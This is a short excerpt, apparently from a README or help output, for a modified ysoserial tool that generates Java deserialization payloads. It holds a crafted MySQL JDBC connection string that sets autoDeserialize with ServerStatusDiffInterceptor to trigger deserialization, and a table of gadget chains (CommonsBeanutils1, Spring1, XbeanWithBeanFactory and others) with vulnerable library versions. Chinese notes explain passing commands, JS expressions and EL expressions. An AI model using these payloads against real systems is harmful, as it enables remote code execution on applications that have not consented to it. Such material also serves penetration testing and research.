...
```shell
Java -jar ysoserial_mysqlpipe-0.0.6-all.jar
...
mysql8: jdbc:mysql://xxx/test?&maxAllowedPacket=74996390&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=output.pcap
  Available payload types:
     ...
     CommonsBeanutils1    @Unam4                                 commons-beanutils:1.5-1.10,命令后面:_version,eg:calc_1.8,默认1.9
     ...
     MozillaRhino3        @_tint0                                js:1.7R2 加载js表达式
     Myfaces1             @mbechler
     Myfaces2             @mbechler
     ROME                 @mbechler                              rome:1.0
     Scala1               @artsploit                             scala-library:2.13.6  修改SystemProperties的值。 eg: com.sun.jndi.ldap.object.trustSerialData#true
     Spring1              @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2              @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS               @gebl
     Vaadin1              @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1              @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
     XbeanWithBeanFactory @Unam4                                 org.apache.xbean-naming:all, BeanFactory(Tomcat<10.1.0-M14、10.0.21、9.0.63、8.5.79
 ```
MozillaRhino3传入js表达式。
XbeanWithBeanFactory 加载el表达式
